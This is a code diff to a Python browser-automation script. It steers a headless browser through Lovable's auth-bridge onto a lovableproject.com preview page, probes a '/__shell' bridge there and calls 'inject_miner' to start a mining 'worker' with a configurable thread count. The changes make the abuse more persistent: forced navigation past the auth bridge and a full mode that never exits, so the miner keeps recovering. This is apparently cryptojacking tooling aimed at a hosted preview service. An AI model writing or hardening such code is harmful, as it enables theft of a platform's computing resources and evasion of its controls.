@@ -407,25 +407,28 @@ async def goto_retry(page, url, timeout_ms=30000, tries=3, wait_until="load"):
     return False
 
 
-async def wait_for_bridge(page, tries=100) -> bool:
-    """Poll until preview leaves auth-bridge and is on lovableproject.com."""
+async def wait_for_bridge(page, tries=20) -> bool:
+    """Poll until preview leaves auth-bridge and is on lovableproject.com.
+
+    Keep this short (~1min): on Railway+proxy the juggler pipe often dies
+    during a long auth-bridge stall; caller force-navs afterward.
+    """
     for i in range(tries):
         await asyncio.sleep(3)
         try:
             u = page.url or ""
             if "auth-bridge" in u or "auth-token" in u:
-                if i % 5 == 0:
+                if i % 3 == 0:
                     print(f"   ⏳ still bridging... {u[:100]}")
                 continue
-            if "lovableproject.com" in u:
+            if "lovableproject.com" in (u.split("?", 1)[0]):
                 print(f"   🌉 bridge resolved -> {u[:100]}")
                 return True
-            # Wrong host (e.g. still on lovable.dev chat) — keep waiting briefly
-            if i % 5 == 0:
+            if i % 3 == 0:
                 print(f"   ⏳ waiting for lovableproject.com (now {u[:80]})")
         except Exception:
             return False
-    print("   ⚠️ bridge did not reach lovableproject.com after ~5min, probing anyway")
+    print("   ⚠️ bridge did not reach lovableproject.com after ~1min — force-nav next")
     return False
 
 
@@ -1044,13 +1047,26 @@ async def main():
                     print(f"   ⚠️ still on {cur[:90]} after goto — retry {nav_try}/3")
                     await asyncio.sleep(5)
                 await wait_for_bridge(page)
-                # Final hard check: must be on lovableproject.com
+                # Final hard check: real preview origin only (strip query —
+                # auth-bridge return_url embeds *.lovableproject.com and used
+                # to skip force-nav).
                 cur = page.url or ""
-                if "lovableproject.com" not in cur:
-                    print(f"   🔁 force re-goto (stuck on {cur[:90]})")
-                    await goto_retry(page, preview_url, timeout_ms=120000, wait_until="commit")
-                    await asyncio.sleep(5)
-                    await wait_for_bridge(page)
+                if not _is_preview_target_url(cur):
+                    print(f"   🔁 force location.href (stuck on {cur[:90]})")
+                    try:
+                        await asyncio.wait_for(
+                            page.evaluate(f"window.location.href = {preview_url!r}"),
+                            timeout=15,
+                        )
+                        await asyncio.sleep(8)
+                    except Exception as e:
+                        print(f"   ⚠️ location.href failed: {e}")
+                    try:
+                        await goto_retry(page, preview_url, timeout_ms=90000, wait_until="commit")
+                        await asyncio.sleep(5)
+                        await wait_for_bridge(page)
+                    except Exception as e:
+                        print(f"   ⚠️ force goto failed: {type(e).__name__}: {e}")
                 print(f"   🌐 after bridge: {page.url}")
 
             try:
@@ -1071,6 +1087,10 @@ async def main():
                 await _open_preview(preview_page)
                 print(f"✅ Preview ready: {preview_page.url[:120]}")
             print(f"🌐 preview URL now: {preview_page.url}")
+            if not _is_preview_target_url(preview_page.url or ""):
+                print(f"❌ Still not on lovableproject.com ({(preview_page.url or '')[:120]}) — aborting shell probe")
+                if args.mode == "oneshot":
+                    return
             
             # 10. Probe /__shell on the preview page itself (main frame).
             max_retries = 3
@@ -1096,21 +1116,25 @@ async def main():
                     await _open_preview(preview_page)
 
             if not console_ready:
-                print("❌ Shell bridge never became available - giving up")
+                print("❌ Shell bridge never became available")
                 if args.mode == "oneshot":
                     return
-            
-            # 11. Start worker
-            print("\n⚙️ Starting worker...")
-            success = await inject_miner(preview_page, BRIDGE_URL, args.threads)
-            print(f"🌐 preview URL after inject: {preview_page.url} (success={success})")
-            
-            if not success:
-                print("❌ Worker start failed")
-                if args.mode == "oneshot":
-                    return
-            
-            print("\n✅ Worker is running!")
+                # full/gh: health loop will recover (chat wake + shell wait) — do not exit
+                print("🔄 Full mode — entering health loop to recover shell/worker…")
+
+            # 11. Start worker (only if shell is up)
+            success = False
+            if console_ready:
+                print("\n⚙️ Starting worker...")
+                success = await inject_miner(preview_page, BRIDGE_URL, args.threads)
+                print(f"🌐 preview URL after inject: {preview_page.url} (success={success})")
+                if not success:
+                    print("❌ Worker start failed")
+                    if args.mode == "oneshot":
+                        return
+                    print("🔄 Full mode — health loop will keep recovering…")
+                else:
+                    print("\n✅ Worker is running!")
             
             # 12. Health check loop (refresh every 3min, check for errors)
             print(f"\n🏥 Starting health check ({args.mode} mode)...")
@@ -1122,6 +1146,7 @@ async def main():
                 print(f"⏰ GH mode: will stop after {max_runtime:.1f} minutes")
             
             # Oneshot = keep checking until preview stops loading (error on page), then end
+            # Full = never exit on recovery fail (see miner_injector.health_check_loop)
             await health_check_loop(preview_page, preview_url, mode=args.mode, bridge_url=BRIDGE_URL, context=context, max_runtime_minutes=max_runtime)
             print("\n🏁 Session complete!")
     finally:
